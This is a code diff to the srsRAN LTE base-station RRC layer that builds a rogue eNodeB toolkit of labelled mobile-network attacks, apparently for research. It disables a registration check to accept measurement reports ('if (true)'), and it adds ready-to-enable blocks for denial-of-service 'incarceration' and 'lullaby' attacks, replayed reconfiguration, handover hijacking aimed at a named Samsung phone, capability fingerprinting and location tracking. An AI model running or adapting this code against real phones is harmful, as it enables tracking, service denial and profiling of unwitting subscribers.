@@ -412,7 +412,9 @@ void rrc::ue::parse_ul_dcch(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
       }
       break;
     case ul_dcch_msg_type_c::c1_c_::types::meas_report:
-      if (state == RRC_STATE_REGISTERED) {
+      if (true) { // MSA#4: Get MeasurementReport     
+      // if (state == RRC_STATE_REGISTERED) {
+
         if (mobility_handler != nullptr) {
           mobility_handler->handle_ue_meas_report(ul_dcch_msg.msg.c1().meas_report(), std::move(original_pdu));
         }
@@ -486,6 +488,12 @@ void rrc::ue::handle_rrc_con_req(rrc_conn_request_s* msg)
     }
   }
 
+  // === MSA#13 (Part 1): INCARCERATION WITH RRC REJECT ===
+  // parent->logger.info("[MSA-13] Sending RRCConnectionReject (wait_time=10s) to rnti=0x%x", rnti);
+  // send_connection_reject(procedure_result_code::none);
+  // return;
+  // === END OF MSA#13 (Part 1) ===
+
   establishment_cause = msg_r8->establishment_cause;
   send_connection_setup();
   state = RRC_STATE_WAIT_FOR_CON_SETUP_COMPLETE;
@@ -538,6 +546,43 @@ void rrc::ue::send_connection_setup()
 
 void rrc::ue::handle_rrc_con_setup_complete(rrc_conn_setup_complete_s* msg, srsran::unique_byte_buffer_t pdu)
 {
+  // === MSA#18: RRC REPLAY ATTACK ===
+  // parent->logger.info("[MSA-18] Sending initial & replayed RRCConnectionReconfiguration to rnti=0x%x", rnti);
+  // uint8_t saved_tid = transaction_id;
+  // send_connection_reconf();
+  // transaction_id = saved_tid; // Giữ nguyên rrc_transaction_id để gói thứ 2 có nội dung giống hệt gói thứ 1
+  // send_connection_reconf();
+  // return;
+  // === END OF MSA#18 ===
+
+  // === MSA#17 (HANDOVER HIJACKING) & MỒI KÍCH HOẠT CHO MSA#6 / MSA#7 ===
+  // Send RRCConnectionReconfiguration carrying unencrypnted mobilityControlInfo:
+  // 1. Create packet signature Handover Hijacking (MSA#17) on Wireshark.
+  // 2. 3GPP TS 36.331 5.3.5.5, this packet forces Samsung A20s to reply with
+  //    RRCConnectionReestablishmentRequest (activate MSA#6 or MSA#7 below)
+  // parent->logger.info("[MSA-17 / Trigger MSA-6-7] Sending unprotected mobilityControlInfo to rnti=0x%x", rnti);
+  // dl_dcch_msg_s     dl_dcch_msg;
+  // rrc_conn_recfg_s& rrc_conn_recfg  = dl_dcch_msg.msg.set_c1().set_rrc_conn_recfg();
+  // rrc_conn_recfg.rrc_transaction_id = (uint8_t)((transaction_id++) % 4);
+  // rrc_conn_recfg_r8_ies_s& recfg_r8 = rrc_conn_recfg.crit_exts.set_c1().set_rrc_conn_recfg_r8();
+  // recfg_r8.mob_ctrl_info_present    = true;
+  // recfg_r8.mob_ctrl_info.target_pci = 2;
+  // recfg_r8.mob_ctrl_info.t304       = mob_ctrl_info_s::t304_e_::ms1000;
+  // recfg_r8.mob_ctrl_info.new_ue_id.from_number(rnti);
+  // send_dl_dcch(&dl_dcch_msg);
+  // return;
+  // === END OF MSA#17 ===
+
+  // === MSA#11: LULLABY WITH RRC RESUME ===
+  // parent->logger.info("[MSA-11] Sending unprotected RRCConnectionResume-r13 to rnti=0x%x", rnti);
+  // dl_dcch_msg_s dl_dcch_msg;
+  // auto&         resume_r13      = dl_dcch_msg.msg.set_c1().set_rrc_conn_resume_r13();
+  // resume_r13.rrc_transaction_id = (uint8_t)((transaction_id++) % 4);
+  // resume_r13.crit_exts.set_c1().set_rrc_conn_resume_r13();
+  // send_dl_dcch(&dl_dcch_msg);
+  // return;
+  // === END OF MSA#11 ===
+
   // Log event.
   asn1::json_writer json_writer;
   msg->to_json(json_writer);
@@ -562,6 +607,26 @@ void rrc::ue::handle_rrc_con_setup_complete(rrc_conn_setup_complete_s* msg, srsr
 
   // Signal MAC scheduler that configuration was successful
   mac_ctrl.handle_con_setup_complete();
+
+  // === MSA#13 (Part 2): INCARCERATION WITH RRC RELEASE ===
+  // parent->logger.info("[MSA-13] Sending immediate RRCConnectionRelease to rnti=0x%x", rnti);
+  // send_connection_release();
+  // return;
+  // === END OF MSA#13 (Part 2) ===
+
+  // === MSA#5 & MSA#9: CAPABILITY HIJACKING / MNMAP ===
+  // parent->logger.info("[MSA-5/9] Sending unprotected UECapabilityEnquiry to rnti=0x%x", rnti);
+  // send_ue_cap_enquiry({asn1::rrc::rat_type_opts::options::eutra});
+  // state = RRC_STATE_WAIT_FOR_UE_CAP_INFO;
+  // return;
+  // === END OF MSA#5 & MSA#9 ===
+
+  // === MSA#4: LOCATION TRACKING VIA MEASUREMENT REPORTS ===
+  // parent->logger.info("[MSA-4] Sending unprotected RRCConnectionReconfiguration (measConfig) to rnti=0x%x", rnti);
+  // send_connection_reconf();
+  // send_ue_info_req();
+  // return;
+  // === END OF MSA#4 ===
 
   asn1::s1ap::rrc_establishment_cause_e s1ap_cause;
   s1ap_cause.value = (asn1::s1ap::rrc_establishment_cause_opts::options)establishment_cause.value;
@@ -621,6 +686,19 @@ void rrc::ue::handle_rrc_con_reest_req(rrc_conn_reest_request_s* msg)
                                     rnti);
   const rrc_conn_reest_request_r8_ies_s& req_r8   = msg->crit_exts.rrc_conn_reest_request_r8();
   uint16_t                               old_rnti = req_r8.ue_id.c_rnti.to_number();
+
+  // === MSA#6: INCARCERATION WITH RRC REESTABLISHMENT REJECT ===
+  // parent->logger.info("[MSA-6] Forcing RRCConnectionReestablishmentReject for rnti=0x%x", rnti);
+  // send_connection_reest_rej(procedure_result_code::error_unknown_rnti);
+  // return;
+  // === END OF MSA#6 ===
+
+  // === MSA#7: LULLABY USING RRC REESTABLISHMENT REQUEST ===
+  // parent->logger.info("[MSA-7] Accepting Reestablishment to keep UE in Reestablishment loop, rnti=0x%x", rnti);
+  // send_connection_reest(0);
+  // state = RRC_STATE_WAIT_FOR_CON_REEST_COMPLETE;
+  // return;
+  // === END OF MSA#7 ===
 
   if (not parent->s1ap->is_mme_connected()) {
     parent->logger.error("RRCReestablishmentReject for rnti=0x%x. Cause: MME not connected", rnti);
@@ -997,6 +1075,12 @@ void rrc::ue::handle_rrc_reconf_complete(rrc_conn_recfg_complete_s* msg, srsran:
 
   // Activate SCells and bearers in the MAC scheduler that were advertised in the RRC Reconf message
   mac_ctrl.handle_con_reconf_complete();
+
+  // === MSA#19: LULLABY WITH REPEATED RRC RECONFIGURATION ===
+  // parent->logger.info("[MSA-19] Re-sending RRCConnectionReconfiguration in loop to rnti=0x%x", rnti);
+  // send_connection_reconf();
+  // return;
+  // === END OF MSA#19 ===
 
   // If performing handover, signal its completion
   mobility_handler->trigger(*msg);
